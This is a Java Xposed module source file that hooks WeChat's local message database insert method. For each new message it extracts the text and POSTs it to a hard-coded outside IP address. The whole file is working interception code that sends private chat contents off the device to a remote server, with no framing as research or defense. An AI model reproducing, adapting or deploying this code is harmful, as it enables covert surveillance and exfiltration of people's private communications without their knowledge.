package com.example.wx;
import android.content.ContentValues;

import java.util.HashMap;
import java.util.Map;
import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import com.example.wx.HttpUtils;

public class HookMessages implements IXposedHookLoadPackage{

    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable{
        try {
            if (loadPackageParam.packageName.equals("com.tencent.mm")){
                XposedBridge.log("hooking...");
                // 导入需要hook的类
                Class cls = loadPackageParam.classLoader.loadClass("com.tencent.wcdb.database.SQLiteDatabase");
                // 找到目标方法并hook
                XposedHelpers.findAndHookMethod(cls, "insertWithOnConflict",  String.class, String.class, ContentValues.class, int.class, new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                        super.beforeHookedMethod(param);
                    }
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        ContentValues contentValues = (ContentValues) param.args[2];
                        for (String key : contentValues.keySet()){
                            if (key.equals("content")){
                                HashMap<String,String> paramsMap = new HashMap<String, String>() ;
                                paramsMap.put("content", (String) contentValues.get(key));
                                HttpUtils.post("http://106.14.158.63:8080/wxapi",paramsMap);
                                XposedBridge.log(String.format("[message insert]->%s", contentValues.get(key)));
                            }
                        }
                    }
                });
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }


}